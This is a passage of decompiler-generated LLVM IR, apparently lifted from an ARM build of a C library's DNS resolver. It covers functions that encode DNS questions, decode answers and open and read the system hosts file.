  %v1_16c84 = zext i8 %tmp6 to i32
  %v2_16c88 = add i32 %arg2, 12
  %v3_16c88 = inttoptr i32 %v2_16c88 to i32*
  store i32 %v1_16c84, i32* %v3_16c88, align 4
  %v4_16c8c = load i8, i8* %v3_16c60, align 1
  %div2 = udiv i8 %v4_16c8c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_16c94 = zext i8 %tmp7 to i32
  %v2_16c98 = add i32 %arg2, 16
  %v3_16c98 = inttoptr i32 %v2_16c98 to i32*
  store i32 %v1_16c94, i32* %v3_16c98, align 4
  %v4_16c9c = load i8, i8* %v3_16c60, align 1
  %tmp8 = urem i8 %v4_16c9c, 2
  %v1_16ca0 = zext i8 %tmp8 to i32
  %v2_16ca4 = add i32 %arg2, 20
  %v3_16ca4 = inttoptr i32 %v2_16ca4 to i32*
  store i32 %v1_16ca0, i32* %v3_16ca4, align 4
  %v2_16ca8 = add i32 %tmp, 3
  %v3_16ca8 = inttoptr i32 %v2_16ca8 to i8*
  %v4_16ca8 = load i8, i8* %v3_16ca8, align 1
  %tmp9 = icmp slt i8 %v4_16ca8, 0
  %v3_16cac = zext i1 %tmp9 to i32
  %v2_16cb0 = add i32 %arg2, 24
  %v3_16cb0 = inttoptr i32 %v2_16cb0 to i32*
  store i32 %v3_16cac, i32* %v3_16cb0, align 4
  %v4_16cb4 = load i8, i8* %v3_16ca8, align 1
  %tmp10 = urem i8 %v4_16cb4, 16
  %v1_16cb8 = zext i8 %tmp10 to i32
  %v2_16cbc = add i32 %arg2, 28
  %v3_16cbc = inttoptr i32 %v2_16cbc to i32*
  store i32 %v1_16cb8, i32* %v3_16cbc, align 4
  %v2_16cc0 = add i32 %tmp, 4
  %v3_16cc0 = inttoptr i32 %v2_16cc0 to i8*
  %v4_16cc0 = load i8, i8* %v3_16cc0, align 1
  %v5_16cc0 = zext i8 %v4_16cc0 to i32
  %v2_16cc4 = add i32 %tmp, 5
  %v3_16cc4 = inttoptr i32 %v2_16cc4 to i8*
  %v4_16cc4 = load i8, i8* %v3_16cc4, align 1
  %v5_16cc4 = zext i8 %v4_16cc4 to i32
  %v4_16cc8 = mul nuw nsw i32 %v5_16cc0, 256
  %v5_16cc8 = or i32 %v5_16cc4, %v4_16cc8
  %v2_16ccc = add i32 %arg2, 32
  %v3_16ccc = inttoptr i32 %v2_16ccc to i32*
  store i32 %v5_16cc8, i32* %v3_16ccc, align 4
  %v2_16cd0 = add i32 %tmp, 6
  %v3_16cd0 = inttoptr i32 %v2_16cd0 to i8*
  %v4_16cd0 = load i8, i8* %v3_16cd0, align 1
  %v5_16cd0 = zext i8 %v4_16cd0 to i32
  %v2_16cd4 = add i32 %tmp, 7
  %v3_16cd4 = inttoptr i32 %v2_16cd4 to i8*
  %v4_16cd4 = load i8, i8* %v3_16cd4, align 1
  %v5_16cd4 = zext i8 %v4_16cd4 to i32
  %v4_16cd8 = mul nuw nsw i32 %v5_16cd0, 256
  %v5_16cd8 = or i32 %v5_16cd4, %v4_16cd8
  %v2_16cdc = add i32 %arg2, 36
  %v3_16cdc = inttoptr i32 %v2_16cdc to i32*
  store i32 %v5_16cd8, i32* %v3_16cdc, align 4
  %v2_16ce0 = add i32 %tmp, 8
  %v3_16ce0 = inttoptr i32 %v2_16ce0 to i8*
  %v4_16ce0 = load i8, i8* %v3_16ce0, align 1
  %v5_16ce0 = zext i8 %v4_16ce0 to i32
  %v2_16ce4 = add i32 %tmp, 9
  %v3_16ce4 = inttoptr i32 %v2_16ce4 to i8*
  %v4_16ce4 = load i8, i8* %v3_16ce4, align 1
  %v5_16ce4 = zext i8 %v4_16ce4 to i32
  %v4_16ce8 = mul nuw nsw i32 %v5_16ce0, 256
  %v5_16ce8 = or i32 %v5_16ce4, %v4_16ce8
  %v2_16cec = add i32 %arg2, 40
  %v3_16cec = inttoptr i32 %v2_16cec to i32*
  store i32 %v5_16ce8, i32* %v3_16cec, align 4
  %v2_16cf0 = add i32 %tmp, 11
  %v3_16cf0 = inttoptr i32 %v2_16cf0 to i8*
  %v4_16cf0 = load i8, i8* %v3_16cf0, align 1
  %v5_16cf0 = zext i8 %v4_16cf0 to i32
  %v2_16cf4 = add i32 %tmp, 10
  %v3_16cf4 = inttoptr i32 %v2_16cf4 to i8*
  %v4_16cf4 = load i8, i8* %v3_16cf4, align 1
  %v5_16cf4 = zext i8 %v4_16cf4 to i32
  %v4_16cfc = mul nuw nsw i32 %v5_16cf4, 256
  %v5_16cfc = or i32 %v4_16cfc, %v5_16cf0
  %v2_16d00 = add i32 %arg2, 44
  %v3_16d00 = inttoptr i32 %v2_16d00 to i32*
  store i32 %v5_16cfc, i32* %v3_16d00, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 6, 9, 10, 11, 16, 4, 5, 17, 18, 19, 20, 21, 0, 12, 13, 7, 14, 15, 8, 3, 2, 1, 24 }
  uselistorder i32 40, { 10, 11, 4, 13, 1, 12, 2, 0, 5, 6, 7, 8, 9, 3 }
  uselistorder i32 28, { 32, 5, 6, 7, 33, 23, 40, 37, 39, 8, 38, 1, 24, 18, 2, 34, 35, 25, 26, 27, 28, 29, 30, 0, 31, 17, 36, 19, 20, 21, 3, 4, 22, 13, 12, 10, 11, 14, 15, 9, 16 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i8 16, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16d08 = load i32, i32* @r4, align 4
  store i32 %v3_16d08, i32* %stack_var_-16, align 4
  %v6_16d08 = load i32, i32* @r5, align 4
  %v9_16d08 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_16d10 = load i32, i32* %arg1, align 4
  store i32 %v2_16d10, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_16d1c = inttoptr i32 %v2_16d10 to i8*
  %v2_16d1c = call i32 @__encode_dotted(i8* %v1_16d1c)
  store i32 %v2_16d1c, i32* %r0.global-to-local, align 4
  %v1_16d20 = icmp slt i32 %v2_16d1c, 0
  br i1 %v1_16d20, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_16d28 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_16d28, i32* @r4, align 4
  store i32 %v6_16d08, i32* @r5, align 4
  store i32 %v9_16d08, i32* @r6, align 4
  ret i32 %v2_16d1c

bb6:                                              ; preds = %entry
  %v1_16d24 = load i32, i32* @r4, align 4
  %v2_16d24 = sub i32 %v1_16d24, %v2_16d1c
  %v0_16d30 = load i32, i32* @r6, align 4
  %v2_16d30 = add i32 %v0_16d30, %v2_16d1c
  store i32 %v2_16d30, i32* %r2.global-to-local, align 4
  %v7_16d34 = icmp sgt i32 %v2_16d24, 3
  br i1 %v7_16d34, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_16d38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_16d38, i32* @r4, align 4
  store i32 %v6_16d08, i32* @r5, align 4
  store i32 %v9_16d08, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_16d3c = load i32, i32* @r5, align 4
  %v1_16d3c = add i32 %v0_16d3c, 5
  %v2_16d3c = inttoptr i32 %v1_16d3c to i8*
  %v3_16d3c = load i8, i8* %v2_16d3c, align 1
  %v5_16d40 = inttoptr i32 %v2_16d30 to i8*
  store i8 %v3_16d3c, i8* %v5_16d40, align 1
  %v0_16d44 = load i32, i32* @r5, align 4
  %v1_16d44 = add i32 %v0_16d44, 4
  %v2_16d44 = inttoptr i32 %v1_16d44 to i32*
  %v3_16d44 = load i32, i32* %v2_16d44, align 4
  %v1_16d48 = trunc i32 %v3_16d44 to i8
  %v2_16d48 = load i32, i32* %r2.global-to-local, align 4
  %v3_16d48 = add i32 %v2_16d48, 1
  %v4_16d48 = inttoptr i32 %v3_16d48 to i8*
  store i8 %v1_16d48, i8* %v4_16d48, align 1
  %v0_16d4c = load i32, i32* @r5, align 4
  %v1_16d4c = add i32 %v0_16d4c, 9
  %v2_16d4c = inttoptr i32 %v1_16d4c to i8*
  %v3_16d4c = load i8, i8* %v2_16d4c, align 1
  %v2_16d50 = load i32, i32* %r2.global-to-local, align 4
  %v3_16d50 = add i32 %v2_16d50, 2
  %v4_16d50 = inttoptr i32 %v3_16d50 to i8*
  store i8 %v3_16d4c, i8* %v4_16d50, align 1
  %v0_16d54 = load i32, i32* @r5, align 4
  %v1_16d54 = add i32 %v0_16d54, 8
  %v2_16d54 = inttoptr i32 %v1_16d54 to i32*
  %v3_16d54 = load i32, i32* %v2_16d54, align 4
  %v0_16d58 = load i32, i32* %r0.global-to-local, align 4
  %v1_16d58 = add i32 %v0_16d58, 4
  store i32 %v1_16d58, i32* %r0.global-to-local, align 4
  %v1_16d5c = trunc i32 %v3_16d54 to i8
  %v2_16d5c = load i32, i32* %r2.global-to-local, align 4
  %v3_16d5c = add i32 %v2_16d5c, 3
  %v4_16d5c = inttoptr i32 %v3_16d5c to i8*
  store i8 %v1_16d5c, i8* %v4_16d5c, align 1
  %v2_16d60 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16d60, i32* @r4, align 4
  store i32 %v6_16d08, i32* @r5, align 4
  store i32 %v9_16d08, i32* @r6, align 4
  ret i32 %v1_16d58

; uselistorder directives
  uselistorder i32 %v2_16d1c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_16d08, { 1, 0, 2 }
  uselistorder i32 %v6_16d08, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_16d68 = call i32 @__length_dotted()
  %v1_16d6c = icmp slt i32 %v0_16d68, 0
  br i1 %v1_16d6c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_16d70 = add i32 %v0_16d68, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_16d74 = phi i32 [ %v0_16d68, %entry ], [ %v4_16d70, %bb ]
  ret i32 %v5_16d74

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_16d78 = load i32, i32* @r4, align 4
  %v6_16d78 = load i32, i32* @r5, align 4
  %v9_16d78 = load i32, i32* @r6, align 4
  %v12_16d78 = load i32, i32* @r7, align 4
  %v21_16d78 = load i32, i32* @sl, align 4
  %v2_16d7c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_16d7c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_16d98 = call i32 @__decode_dotted()
  store i32 %v0_16d98, i32* %r0.global-to-local, align 4
  store i32 %v0_16d98, i32* @r7, align 4
  %v1_16d9c = icmp slt i32 %v0_16d98, 0
  %v0_16da0 = load i32, i32* @r4, align 4
  %v2_16da0 = add i32 %v0_16da0, %v0_16d98
  store i32 %v2_16da0, i32* %r8.global-to-local, align 4
  br i1 %v1_16d9c, label %bb14, label %dec_label_pc_16db0

dec_label_pc_16db0:                               ; preds = %entry
  %v1_16da8 = load i32, i32* @r5, align 4
  %v2_16da8 = sub i32 %v1_16da8, %v2_16da0
  %v1_16db0 = add i32 %v2_16da8, -10
  store i32 %v1_16db0, i32* @r5, align 4
  %v6_16db0 = icmp slt i32 %v1_16db0, 0
  store i32 %v2_16d7c, i32* %r0.global-to-local, align 4
  %v0_16db8 = load i32, i32* @sl, align 4
  %v2_16db8 = add i32 %v0_16db8, %v2_16da0
  store i32 %v2_16db8, i32* @r4, align 4
  br i1 %v6_16db0, label %bb, label %dec_label_pc_16dc4

bb:                                               ; preds = %dec_label_pc_16db0
  br label %bb14

dec_label_pc_16dc4:                               ; preds = %dec_label_pc_16db0
  %v1_16dc4 = bitcast i32* %stack_var_-288 to i8*
  %v2_16dc4 = call i32 @__GI_strdup(i8* %v1_16dc4)
  store i32 %v2_16dc4, i32* %r0.global-to-local, align 4
  %v1_16dc8 = load i32, i32* @r6, align 4
  %v2_16dc8 = inttoptr i32 %v1_16dc8 to i32*
  store i32 %v2_16dc4, i32* %v2_16dc8, align 4
  %v0_16dcc = load i32, i32* @sl, align 4
  %v1_16dcc = load i32, i32* %r8.global-to-local, align 4
  %v2_16dcc = add i32 %v1_16dcc, %v0_16dcc
  %v3_16dcc = inttoptr i32 %v2_16dcc to i8*
  %v4_16dcc = load i8, i8* %v3_16dcc, align 1
  %v6_16dcc = zext i8 %v4_16dcc to i32
  %v0_16dd0 = load i32, i32* @r4, align 4
  %v1_16dd0 = add i32 %v0_16dd0, 1
  %v2_16dd0 = inttoptr i32 %v1_16dd0 to i8*
  %v3_16dd0 = load i8, i8* %v2_16dd0, align 1
  %v4_16dd0 = zext i8 %v3_16dd0 to i32
  %v4_16dd4 = mul nuw nsw i32 %v6_16dcc, 256
  %v5_16dd4 = or i32 %v4_16dd0, %v4_16dd4
  store i32 %v5_16dd4, i32* %r3.global-to-local, align 4
  %v1_16dd8 = load i32, i32* @r6, align 4
  %v2_16dd8 = add i32 %v1_16dd8, 4
  %v3_16dd8 = inttoptr i32 %v2_16dd8 to i32*
  store i32 %v5_16dd4, i32* %v3_16dd8, align 4
  %v0_16ddc = load i32, i32* @r4, align 4
  %v1_16ddc = add i32 %v0_16ddc, 2
  store i32 %v1_16ddc, i32* %r1.global-to-local, align 4
  %v2_16de0 = inttoptr i32 %v1_16ddc to i8*
  %v3_16de0 = load i8, i8* %v2_16de0, align 1
  %v4_16de0 = zext i8 %v3_16de0 to i32
  %v1_16de4 = add i32 %v0_16ddc, 3
  %v2_16de4 = inttoptr i32 %v1_16de4 to i8*
  %v3_16de4 = load i8, i8* %v2_16de4, align 1
  %v4_16de4 = zext i8 %v3_16de4 to i32
  %v4_16de8 = mul nuw nsw i32 %v4_16de0, 256
  %v5_16de8 = or i32 %v4_16de4, %v4_16de8
  store i32 %v5_16de8, i32* %r3.global-to-local, align 4
  %v1_16dec = load i32, i32* @r6, align 4
  %v2_16dec = add i32 %v1_16dec, 8
  %v3_16dec = inttoptr i32 %v2_16dec to i32*
  store i32 %v5_16de8, i32* %v3_16dec, align 4
  %v0_16df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16df0 = add i32 %v0_16df0, 2
  %v1_16df4 = add i32 %v0_16df0, 3
  %v2_16df4 = inttoptr i32 %v1_16df4 to i8*
  %v3_16df4 = load i8, i8* %v2_16df4, align 1
  %v4_16df4 = zext i8 %v3_16df4 to i32
  store i32 %v4_16df4, i32* %r3.global-to-local, align 4
  %v2_16df8 = inttoptr i32 %v1_16df0 to i8*
  %v3_16df8 = load i8, i8* %v2_16df8, align 1
  %v4_16df8 = zext i8 %v3_16df8 to i32
  store i32 %v4_16df8, i32* %r0.global-to-local, align 4
  %v1_16dfc = add i32 %v0_16df0, 5
  %v2_16dfc = inttoptr i32 %v1_16dfc to i8*
  %v3_16dfc = load i8, i8* %v2_16dfc, align 1
  %v4_16dfc = zext i8 %v3_16dfc to i32
  store i32 %v4_16dfc, i32* @ip, align 4
  %v3_16e00 = mul nuw nsw i32 %v4_16df4, 65536
  store i32 %v3_16e00, i32* %r3.global-to-local, align 4
  %v1_16e04 = add i32 %v0_16df0, 4
  %v2_16e04 = inttoptr i32 %v1_16e04 to i8*
  %v3_16e04 = load i8, i8* %v2_16e04, align 1
  %v4_16e04 = zext i8 %v3_16e04 to i32
  %v4_16e08 = mul nuw i32 %v4_16df8, 16777216
  %v5_16e08 = or i32 %v4_16e08, %v3_16e00
  %v2_16e0c = or i32 %v5_16e08, %v4_16dfc
  %v4_16e10 = mul nuw nsw i32 %v4_16e04, 256
  %v5_16e10 = or i32 %v2_16e0c, %v4_16e10
  store i32 %v5_16e10, i32* %r3.global-to-local, align 4
  %v1_16e14 = load i32, i32* @r6, align 4
  %v2_16e14 = add i32 %v1_16e14, 12
  %v3_16e14 = inttoptr i32 %v2_16e14 to i32*
  store i32 %v5_16e10, i32* %v3_16e14, align 4
  %v0_16e18 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e18 = add i32 %v0_16e18, 6
  %v2_16e18 = inttoptr i32 %v1_16e18 to i8*
  %v3_16e18 = load i8, i8* %v2_16e18, align 1
  %v4_16e18 = zext i8 %v3_16e18 to i32
  %v0_16e1c = load i32, i32* @r4, align 4
  %v1_16e1c = add i32 %v0_16e1c, 9
  %v2_16e1c = inttoptr i32 %v1_16e1c to i8*
  %v3_16e1c = load i8, i8* %v2_16e1c, align 1
  %v4_16e1c = zext i8 %v3_16e1c to i32
  %v1_16e20 = add i32 %v0_16e1c, 10
  store i32 %v1_16e20, i32* %r0.global-to-local, align 4
  %v4_16e24 = mul nuw nsw i32 %v4_16e18, 256
  %v5_16e24 = or i32 %v4_16e1c, %v4_16e24
  store i32 %v5_16e24, i32* %r3.global-to-local, align 4
  %v0_16e28 = load i32, i32* %r8.global-to-local, align 4
  %v1_16e28 = add i32 %v0_16e28, 10
  %v0_16e2c = load i32, i32* @r5, align 4
  %v1_16e30 = add nuw nsw i32 %v5_16e24, 10
  store i32 %v1_16e30, i32* %r1.global-to-local, align 4
  %v1_16e34 = load i32, i32* @r6, align 4
  %v2_16e34 = add i32 %v1_16e34, 24
  %v3_16e34 = inttoptr i32 %v2_16e34 to i32*
  store i32 %v1_16e28, i32* %v3_16e34, align 4
  %v0_16e38 = load i32, i32* %r0.global-to-local, align 4
  %v1_16e38 = load i32, i32* @r6, align 4
  %v2_16e38 = add i32 %v1_16e38, 20
  %v3_16e38 = inttoptr i32 %v2_16e38 to i32*
  store i32 %v0_16e38, i32* %v3_16e38, align 4
  %v0_16e3c = load i32, i32* %r3.global-to-local, align 4
  %v1_16e3c = load i32, i32* @r6, align 4
  %v2_16e3c = add i32 %v1_16e3c, 16
  %v3_16e3c = inttoptr i32 %v2_16e3c to i32*
  store i32 %v0_16e3c, i32* %v3_16e3c, align 4
  %v0_16e40 = load i32, i32* @r7, align 4
  %v1_16e40 = load i32, i32* %r1.global-to-local, align 4
  %v2_16e40 = add i32 %v1_16e40, %v0_16e40
  %v5_16e44 = icmp slt i32 %v0_16e2c, %v5_16e24
  %.v2_16e40 = select i1 %v5_16e44, i32 -1, i32 %v2_16e40
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_16dc4, %entry
  %v0_16e48 = phi i32 [ %.v2_16e40, %dec_label_pc_16dc4 ], [ %v1_16db0, %bb ], [ %v0_16d98, %entry ]
  store i32 %v0_16e48, i32* %r0.global-to-local, align 4
  store i32 %v3_16d78, i32* @r4, align 4
  store i32 %v6_16d78, i32* @r5, align 4
  store i32 %v9_16d78, i32* @r6, align 4
  store i32 %v12_16d78, i32* @r7, align 4
  store i32 %v21_16d78, i32* @sl, align 4
  ret i32 %v0_16e48

; uselistorder directives
  uselistorder i32 %v0_16e48, { 1, 0 }
  uselistorder i32 %v5_16e24, { 1, 0, 2 }
  uselistorder i32 %v3_16e00, { 1, 0 }
  uselistorder i32 %v1_16db0, { 0, 2, 1 }
  uselistorder i32 %v0_16d98, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 20, { 28, 29, 30, 31, 0, 20, 34, 3, 35, 1, 4, 32, 5, 21, 22, 11, 27, 12, 6, 2, 7, 23, 24, 25, 26, 13, 33, 14, 15, 16, 17, 18, 19, 8, 9, 10 }
  uselistorder i32 24, { 26, 27, 28, 18, 35, 0, 29, 30, 31, 19, 10, 36, 11, 1, 32, 20, 21, 22, 23, 24, 25, 12, 33, 34, 13, 14, 15, 16, 17, 7, 8, 4, 3, 9, 2, 5, 6, 37 }
  uselistorder i32 9, { 13, 14, 15, 16, 17, 3, 18, 4, 7, 21, 5, 8, 9, 10, 11, 12, 6, 2, 1, 0, 19, 20 }
  uselistorder i32 6, { 20, 21, 22, 13, 14, 17, 18, 1, 2, 24, 3, 4, 19, 0, 5, 6, 7, 8, 9, 15, 16, 10, 12, 11, 23 }
  uselistorder i32 5, { 1, 20, 21, 22, 11, 6, 2, 12, 13, 7, 14, 3, 5, 0, 18, 19, 15, 16, 17, 8, 10, 9, 4, 23, 24 }
  uselistorder i32 (i8*)* @__GI_strdup, { 2, 0, 1 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1b060.894 to i32), i32* @r1, align 4
  %v0_16e58 = load i32, i32* @lr, align 4
  store i32 %v0_16e58, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1b0c4.928 to i32), i32* @r0, align 4
  %v3_16e60 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1b0c4.928 to i32), i32 ptrtoint (i32* @global_var_1b060.894 to i32))
  %v2_16e64 = icmp eq i32 %v3_16e60, 0
  store i32 ptrtoint (i32* @global_var_1b060.894 to i32), i32* @r1, align 4
  br i1 %v2_16e64, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_16e60

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1b0d0.930 to i32), i32* @r0, align 4
  %v2_16e74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16e74, i32* @lr, align 4
  %v3_16e78 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1b0d0.930 to i32), i32 ptrtoint (i32* @global_var_1b060.894 to i32))
  ret i32 %v3_16e78

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 5, 1, 0, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1b060.894 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_16e88 = load i32, i32* @r4, align 4
  %v6_16e88 = load i32, i32* @r5, align 4
  %v12_16e88 = load i32, i32* @r7, align 4
  %v15_16e88 = load i32, i32* @r8, align 4
  %v21_16e88 = load i32, i32* @sl, align 4
  %v24_16e88 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_16e94 = sub i32 0, %tmp61
  %v1_16e98 = urem i32 %v1_16e94, 4
  store i32 %v1_16e98, i32* @ip, align 4
  %v2_16e98 = icmp eq i32 %v1_16e98, 0
  %v0_16e9c = load i32, i32* @r2, align 4
  %v0_16ea0 = load i32, i32* @r0, align 4
  %v0_16ea4 = load i32, i32* @r1, align 4
  %v0_16ea8 = load i32, i32* @r3, align 4
  store i32 %v0_16ea8, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_16e98, label %dec_label_pc_16ec8, label %dec_label_pc_16eb8

dec_label_pc_16eb8:                               ; preds = %entry
  %v2_16eb8 = sub i32 %tmp57, %v1_16e98
  %v3_16eb8 = icmp ult i32 %tmp57, %v1_16e98
  br i1 %v3_16eb8, label %dec_label_pc_1719c, label %dec_label_pc_16ec0

dec_label_pc_16ec0:                               ; preds = %dec_label_pc_16eb8
  store i32 %v2_16eb8, i32* %r2.global-to-local, align 4
  %v2_16ec4 = add i32 %v1_16e98, %tmp61
  store i32 %v2_16ec4, i32* @r4, align 4
  br label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %entry, %dec_label_pc_16ec0
  %v0_16ed8 = phi i32 [ %tmp61, %entry ], [ %v2_16ec4, %dec_label_pc_16ec0 ]
  %v0_16edc = phi i32 [ %tmp57, %entry ], [ %v2_16eb8, %dec_label_pc_16ec0 ]
  %tmp = icmp ult i32 %v0_16edc, 32
  br i1 %tmp, label %dec_label_pc_1719c, label %dec_label_pc_16ed0

dec_label_pc_16ed0:                               ; preds = %dec_label_pc_16ec8
  store i32 %v0_16ea8, i32* %r0.global-to-local, align 4
  %v7_16ed4 = icmp eq i32 %v0_16ea8, 1
  %v1_16ed8 = add i32 %v0_16ed8, 32
  store i32 %v1_16ed8, i32* @fp, align 4
  %v1_16edc = add i32 %v0_16edc, -32
  store i32 %v1_16edc, i32* @r8, align 4
  br i1 %v7_16ed4, label %dec_label_pc_17008, label %dec_label_pc_16ee4

dec_label_pc_16ee4:                               ; preds = %dec_label_pc_16ed0
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_16ef0 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_16ef0, align 4
  %tmp80 = icmp ult i32 %v1_16edc, 4
  br i1 %tmp80, label %dec_label_pc_1719c, label %dec_label_pc_16ef8

dec_label_pc_16ef8:                               ; preds = %dec_label_pc_16ee4
  %v0_16ef8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16ef8 = add i32 %v0_16ef8, -36
  store i32 %v1_16ef8, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_16ef8, 8
  br i1 %tmp81, label %dec_label_pc_1719c, label %dec_label_pc_16f04

dec_label_pc_16f04:                               ; preds = %dec_label_pc_16ef8
  %v0_16f04 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_16f04, 16
  br i1 %tmp82, label %dec_label_pc_1719c, label %dec_label_pc_16f0c

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16f04
  %v1_16f0c = add i32 %v0_16ef8, -48
  store i32 %v1_16f0c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_16f0c, 8
  br i1 %tmp83, label %dec_label_pc_1719c, label %dec_label_pc_16f18

dec_label_pc_16f18:                               ; preds = %dec_label_pc_16f0c
  %v1_16f18 = add i32 %v0_16ef8, -44
  store i32 %v1_16f18, i32* @r8, align 4
  %v1_16f1c = add i32 %v0_16ef8, -56
  store i32 %v1_16f1c, i32* %r3.global-to-local, align 4
  %v3_16f20 = icmp ult i32 %v1_16f1c, %v1_16f18
  br i1 %v3_16f20, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_16f18
  %v1_16f28 = load i32, i32* @r4, align 4
  %v2_16f28 = add i32 %v1_16f28, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_16f18
  store i32 %v1_16f1c, i32* @r8, align 4
  %v1_16f2c.pre = load i32, i32* @r4, align 4
  %v2_16f2c = add i32 %v1_16f2c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_16f2c, %.thread1 ], [ %v2_16f28, %bb ]
  %v0_16f34 = phi i32 [ %v1_16f2c.pre, %.thread1 ], [ %v1_16f28, %bb ]
  %v0_16f30 = phi i32 [ %v1_16f1c, %.thread1 ], [ %v1_16f18, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_16f34 = add i32 %v0_16f34, 36
  store i32 %v1_16f34, i32* @r6, align 4
  %v1_16f38 = add i32 %v0_16f34, 48
  store i32 %v1_16f38, i32* @sl, align 4
  %tmp84 = icmp ult i32 %v0_16f30, 80
  br i1 %tmp84, label %dec_label_pc_1719c, label %dec_label_pc_16f40

dec_label_pc_16f40:                               ; preds = %bb74
  %v0_16f40 = call i32 @__open_etc_hosts()
  store i32 %v0_16f40, i32* %r0.global-to-local, align 4
  %v2_16f44 = icmp eq i32 %v0_16f40, 0
  br i1 %v2_16f44, label %dec_label_pc_16f60, label %.thread

.thread:                                          ; preds = %dec_label_pc_16f40
  %v1_16f4c = load i32, i32* @fp, align 4
  store i32 %v1_16f4c, i32* @r7, align 4
  %v1_16f50 = load i32, i32* @r5, align 4
  store i32 %v1_16f50, i32* @fp, align 4
  %v1_16f54 = load i32, i32* @r6, align 4
  %v1_16f58 = load i32, i32* @sl, align 4
  br label %dec_label_pc_17014

dec_label_pc_16f60:                               ; preds = %dec_label_pc_16f40
  store i32 0, i32* %r3.global-to-local, align 4
